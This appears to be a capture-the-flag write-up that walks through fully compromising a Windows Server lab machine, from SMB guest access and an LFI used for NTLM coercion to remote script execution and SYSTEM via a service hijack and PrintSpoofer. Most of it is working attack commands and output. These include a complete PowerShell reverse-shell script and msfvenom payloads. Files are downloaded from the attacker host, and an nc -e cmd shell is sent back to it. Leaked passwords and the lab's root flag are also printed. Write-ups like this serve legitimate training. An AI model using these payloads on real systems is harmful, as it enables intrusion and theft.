# Network Scan
```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-01T00:04:48+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WIN-0MTGMLVOBBO
| Issuer: commonName=WIN-0MTGMLVOBBO
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-11T18:31:30
| Not valid after:  2027-04-12T18:31:30
| MD5:     aeac 10ed 6e2a 5176 02e8 64dd 9f14 5a99
| SHA-1:   f325 73e4 a23f 341a 2d3f b8ad 9d06 45e9 23ac 157c
|_SHA-256: 330f 1d38 5b67 79ee e2ea 11b2 7634 eeb5 fb59 0e49 6e2c f91b 9be0 a13e d63b dbac
| rdp-ntlm-info: 
|   Target_Name: WIN-0MTGMLVOBBO
|   NetBIOS_Domain_Name: WIN-0MTGMLVOBBO
|   NetBIOS_Computer_Name: WIN-0MTGMLVOBBO
|   DNS_Domain_Name: WIN-0MTGMLVOBBO
|   DNS_Computer_Name: WIN-0MTGMLVOBBO
|   Product_Version: 10.0.20348
|_  System_Time: 2026-11-01T00:04:10+00:00
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Unauthenticated Enumeration

First i begin probing SMB and find `guest` authentication is enabled which allows me to READ the share `fyodor_documents_backup`.

```bash
$ nxc smb 10.1.148.89 -u 'guest' -p '' --shares                     
SMB         10.1.148.89     445    WIN-0MTGMLVOBBO  [*] Windows Server 2022 Build 20348 x64 (name:WIN-0MTGMLVOBBO) (domain:WIN-0MTGMLVOBBO) (signing:False) (SMBv1:None)
SMB         10.1.148.89     445    WIN-0MTGMLVOBBO  [+] WIN-0MTGMLVOBBO\guest: 
SMB         10.1.148.89     445    WIN-0MTGMLVOBBO  [*] Enumerated shares
SMB         10.1.148.89     445    WIN-0MTGMLVOBBO  Share           Permissions     Remark
SMB         10.1.148.89     445    WIN-0MTGMLVOBBO  -----           -----------     ------
SMB         10.1.148.89     445    WIN-0MTGMLVOBBO  ADMIN$                          Remote Admin
SMB         10.1.148.89     445    WIN-0MTGMLVOBBO  C$                              Default share
SMB         10.1.148.89     445    WIN-0MTGMLVOBBO  fyodor_documents_backup READ            
SMB         10.1.148.89     445    WIN-0MTGMLVOBBO  IPC$            READ            Remote IPC
```

I then use `smbclient` to dump all files within the share for local inspection.

```bash
$ smbclient -N //10.1.148.89/fyodor_documents_backup
WARNING: no network interfaces found
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \backup.ps1 of size 703 as backup.ps1 (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \app\app.py of size 7422 as app/app.py (1.9 KiloBytes/sec) (average 1.2 KiloBytes/sec)
```

## Findings

```bash
$ cat backup.ps1                                 
$Source      = "C:\MyFiles"
$Destination = "\\backupsrv\\backup"

$Username = "admin"
$Password = "Welcome1!" #Need to update script with new password
```

I also find that there is a web server running on port 80 which was not found on the network scan. The source code is leaked which reveals a LFI in the `/logs` endpoint.

```python
@app.route("/logs")
def logs():
    
    path = request.args.get("file", "")
    
    if not path:
        path = request.args.get("file", "app.log")
    
    if not path:
        return render_template_string(
            STYLE + NAV + """
            <div class="container">
                <div class="card">
                    <h1>Logs</h1>
                    <p class="error">Invalid file path.</p>
                </div>
            </div>
            """,
            400
        )
    
    if ".py" in path:
        return render_template_string(
            STYLE + NAV + """
            <div class="container">
                <div class="card">
                    <h1>Logs</h1>
                    <p class="error">Can't access this file.</p>
                </div>
            </div>
            """
        ), 403
    
    if not os.path.isfile(path):
        return render_template_string(
            STYLE + NAV + """
            <div class="container">
                <div class="card">
                    <h1>Logs</h1>
                    <p class="error">File not found.</p>
                </div>
            </div>
            """
        ), 404

    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            contents = f.read()
    except OSError as e:
        return f"Unable to read file: {e}", 500

    return render_template_string(
        STYLE + NAV + """
        <div class="container">
            <div class="card">
                <h1>Log: {{ filename }}</h1>
                <pre>{{ contents }}</pre>
            </div>
        </div>
        """,
        filename=path,
        contents=contents
    )
```

There is no filtering for `/` or `\` knowing this i manage to gain a hash for the user `fyodor` using NTLM coercion in the `file=` parameter.

<img width="1387" height="267" alt="image" src="https://github.com/user-attachments/assets/18a45c54-d0bc-4566-839f-cd6abfe177c3" />


```bash
$ sudo responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.1.148.89
[SMB] NTLMv2-SSP Username : WIN-0MTGMLVOBBO\fyodor
[SMB] NTLMv2-SSP Hash     : fyodor::WIN-0MTGMLVOBBO:5611c4eca13137ed:8F0B0D8A4B9754570ED8838D958D1590:010100000000000000305C3F9669DD012E4D19EE762416C900000000020008004F0051004F00440001001E00570049004E002D005200470056003600450034005500350039005400320004003400570049004E002D00520047005600360045003400550035003900540032002E004F0051004F0044002E004C004F00430041004C00030014004F0051004F0044002E004C004F00430041004C00050014004F0051004F0044002E004C004F00430041004C000700080000305C3F9669DD0106000400020000000800300030000000000000000000000000200000190D2F4B1340E8422A6E47C32A8D53F7A46E23FFDA8942AF2EF4F2391610D7EA0A001000000000000000000000000000000000000900260063006900660073002F00310030002E003200300030002E003100310034002E003200300033000000000000000000
```

This hash did not crack but i do now have a valid username. Knowing this i moved back to the LFI and began testing for this users home folder.

<img width="1375" height="381" alt="image" src="https://github.com/user-attachments/assets/ae6685b1-b8a9-47b5-b80d-4455f12d3410" />


This confirmed the user had a home folder. I then checked for a updated version of the backup script.

<img width="1381" height="493" alt="image" src="https://github.com/user-attachments/assets/0562247a-ede0-420f-ac1a-fc8f3f023d67" />


I should now be able to get a reverse shell in the `run script` section of the webpage after authenticating as admin.

```
$Username = "admin"
$Password = "HallacaDeCarneFTW123!"
```

# Access as fyodor

After logging in with the credentials above i am met with a input to run a script

The `app.py` shows some sanitizing off backslashes to try and block remote script execution.

```python
@app.route("/run", methods=["GET", "POST"])
def run_script():
    if not logged_in():
        return redirect(url_for("login"))

    output = None
    error = None

    if request.method == "POST":
        path = request.form.get("script", "")

        if not path:
            error = "Invalid script path."
        
        elif not os.path.isfile(path) and not path.startswith("\\\\"): # sanitization here
            error = "Script not found."
        
        elif not path.lower().endswith(".ps1"):
            error = "Only PowerShell .ps1 files are allowed."

        else:
            try:
                result = subprocess.run(
                    [
                        "powershell.exe",
                        "-executionpolicy",
                        "bypass",
                        "-File",
                        path,
                    ],
                    capture_output=True,
                    text=True
                )

                output = (
                    f"Exit code: {result.returncode}\\n\\n"
                    f"--- STDOUT ---\\n"
                    f"{result.stdout}\\n"
                    f"--- STDERR ---\\n"
                    f"{result.stderr}"
                )

            except OSError as e:
                error = f"Unable to execute PowerShell: {e}"
```

However i manged to get remote script execution as follows.

First i created a reverse shell `.ps1` file

```powershell
$LHOST = "10.200.114.203"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

I then created a `smbserver` with no authentication to host the `.ps1` file.

```bash
$ impacket-smbserver share $(pwd) -smb2support                        
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
```

Finally i only used 3 `\\\` to bypass the check.

<img width="1369" height="445" alt="image" src="https://github.com/user-attachments/assets/6cadf192-f6a2-4598-a6af-3706f08b32cc" />


`\\\10.200.114.203\share\test.ps1`

With a `netcat` listener running i caught a shell and used `msfvenom` to create a `revshell` binary to upgrade the shell quality.

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.200.114.203 LPORT=4444 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.1.148.89 - - [01/Nov/2026 01:05:13] "GET /rev.exe HTTP/1.1" 200 -
```

```powershell
$ nc -lvnp 443                                                 
listening on [any] 443 ...
connect to [10.200.114.203] from (UNKNOWN) [10.1.148.89] 49983
whoami
win-0mtgmlvobbo\fyodor

iwr -uri http://10.200.114.203/rev.exe -outfile rev.exe
.\rev.exe
```

I then started another listener on the port `4444` and caught a new upgraded shell.

```powershell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.200.114.203] from (UNKNOWN) [10.1.148.89] 49987
Microsoft Windows [Version 10.0.20348.5622]
(c) Microsoft Corporation. All rights reserved.

C:\Users\fyodor\Documents>
```

# Gaining system

First i check user groups and tokens to find nothing to interesting. I then run `PrivescCheck.ps1` To find a service running as `NetworkService` which my current user has multiple dangerous permissions over.

https://github.com/itm4n/PrivescCheck/releases


```
Name              : tapisrv
DisplayName       : @C:\Windows\system32\tapisrv.dll,-10100
User              : NT AUTHORITY\NetworkService
ImagePath         : C:\Windows\System32\svchost.exe -k NetworkService -p
StartMode         : Manual
Type              : Win32ShareProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\tapisrv
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
IdentityReference : WIN-0MTGMLVOBBO\fyodor (S-1-5-21-2387301235-874641830-263055908-1000)
Permissions       : ChangeConfig, Start, Stop, ReadControl, GenericWrite



[*] STATUS  : VULNERABLE (High)
[*] TIME    : 00:00:10.508
[*] SUMMARY : No summary available yet.
```

I create another reverse shell to upload to the target using a different port

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.200.114.203 LPORT=4443 -f exe -o rev1.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: rev1.exe

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.1.148.89 - - [01/Nov/2026 01:27:50] "GET /rev1.exe HTTP/1.1" 200 -
```

```powershell
PS C:\users\fyodor\desktop> iwr -uri http://10.200.114.203/rev1.exe -outfile rev1.exe
```

I then grant the `NetworkService` user full permission over the binary

```powershell
PS C:\users\fyodor\desktop> icacls.exe .\rev1.exe /grant NetworkService:F
icacls.exe .\rev1.exe /grant NetworkService:F
processed file: .\rev1.exe
Successfully processed 1 files; Failed processing 0 files
```

Finally i modify the service and start a listener

```powershell
PS C:\users\fyodor\desktop> sc.exe config tapisrv binPath= "C:\users\fyodor\desktop\rev1.exe"            
     
sc.exe config tapisrv binPath= "C:\users\fyodor\desktop\rev1.exe"    
[SC] ChangeServiceConfig SUCCESS

PS C:\users\fyodor\desktop> sc.exe start tapisrv
```

```bash
$ nc -lvnp 4443  
listening on [any] 4443 ...
connect to [10.200.114.203] from (UNKNOWN) [10.1.148.89] 50015
Microsoft Windows [Version 10.0.20348.5622]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                    SID     
============================ ========
nt authority\network service S-1-5-20


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                             Attributes                                        
====================================== ================ =============================================================== ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                      
Everyone                               Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\DoSvc                       Well-known group S-1-5-80-3055155277-3816794035-3994065555-2874236192-2193176987 Enabled by default, Group owner                   
NT SERVICE\tapisrv                     Well-known group S-1-5-80-4230913304-2206818457-801678004-120036174-1892434133   Enabled by default, Enabled group, Group owner    
NT SERVICE\Wecsvc                      Well-known group S-1-5-80-4059739203-877974739-1245631912-527174227-2996563517   Enabled by default, Group owner                   
LOCAL                                  Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I now have control of the `NetworkService` account which has the `SeImpersonate` token enabled.

I then upload the binary `PringSpoofer64.exe` and `nc.exe`

https://github.com/itm4n/printspoofer

```powershell
PS C:\Users\fyodor\Desktop> iwr -uri http://10.200.114.203/nc.exe -outfile nc.exe                                                
PS C:\Users\fyodor\Desktop> iwr http://10.200.114.203/PrintSpoofer64.exe -outfile ps64.exe
```

I then catch a final reverse shell using the following command with a listener running

```powershell
PS C:\Users\fyodor\Desktop> .\ps64.exe -c "C:\users\fyodor\desktop\nc.exe 10.200.114.203 1111 -e cmd"
.\ps64.exe -c "C:\users\fyodor\desktop\nc.exe 10.200.114.203 1111 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
PS C:\Users\fyodor\Desktop> 
```

```bash
$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.200.114.203] from (UNKNOWN) [10.1.148.89] 50037
Microsoft Windows [Version 10.0.20348.5622]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\users\administrator\desktop\root.txt
type C:\users\administrator\desktop\root.txt
e205f85d91490b42ca1b6279d1bf41ba
```
